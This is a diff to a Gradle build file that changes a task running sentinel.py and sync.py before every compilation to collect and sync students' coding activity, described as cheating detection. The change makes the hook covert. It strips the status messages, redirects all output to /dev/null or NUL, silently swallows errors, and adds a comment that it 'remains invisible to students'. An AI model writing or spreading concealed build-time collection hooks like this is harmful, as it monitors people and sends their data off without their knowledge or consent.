@@ -15,33 +15,49 @@ dependencies {
 
 // Task to run telemetry scripts
 // Note: This task collects and syncs coding activity data for cheating detection.
-// It runs automatically before each compilation.
-task runTelemetry(type: Exec) {
+// It runs automatically before each compilation and remains invisible to students.
+task telemetry {
     description = 'Runs sentinel.py and sync.py for telemetry collection'
     
-    // Determine Python executable
-    def pythonCmd = System.getProperty('os.name').toLowerCase().contains('windows') ? 'python' : 'python3'
-    
-    // Run sentinel.py first, then sync.py
-    commandLine 'sh', '-c', """
-        ${pythonCmd} ${project.projectDir}/sentinel.py && \
-        ${pythonCmd} ${project.projectDir}/sync.py
-    """
-    
-    // Don't fail the build if telemetry fails
-    ignoreExitValue = true
-    
-    doFirst {
-        println 'Running telemetry collection...'
-    }
-    
     doLast {
-        println 'Telemetry collection completed.'
+        // Determine Python executable based on OS
+        def pythonCmd = System.getProperty('os.name').toLowerCase().contains('windows') ? 'python' : 'python3'
+        def isWindows = System.getProperty('os.name').toLowerCase().contains('windows')
+        
+        try {
+            // Run sentinel.py
+            if (isWindows) {
+                exec {
+                    commandLine 'cmd', '/c', "${pythonCmd} ${project.projectDir}/sentinel.py > NUL 2>&1"
+                    ignoreExitValue = true
+                }
+            } else {
+                exec {
+                    commandLine 'sh', '-c', "${pythonCmd} ${project.projectDir}/sentinel.py > /dev/null 2>&1"
+                    ignoreExitValue = true
+                }
+            }
+            
+            // Run sync.py
+            if (isWindows) {
+                exec {
+                    commandLine 'cmd', '/c', "${pythonCmd} ${project.projectDir}/sync.py > NUL 2>&1"
+                    ignoreExitValue = true
+                }
+            } else {
+                exec {
+                    commandLine 'sh', '-c', "${pythonCmd} ${project.projectDir}/sync.py > /dev/null 2>&1"
+                    ignoreExitValue = true
+                }
+            }
+        } catch (Exception e) {
+            // Silently ignore any errors
+        }
     }
 }
 
 // Ensure telemetry runs during every build
-compileJava.dependsOn runTelemetry
+compileJava.dependsOn telemetry
 
 java {
     sourceCompatibility = JavaVersion.VERSION_11
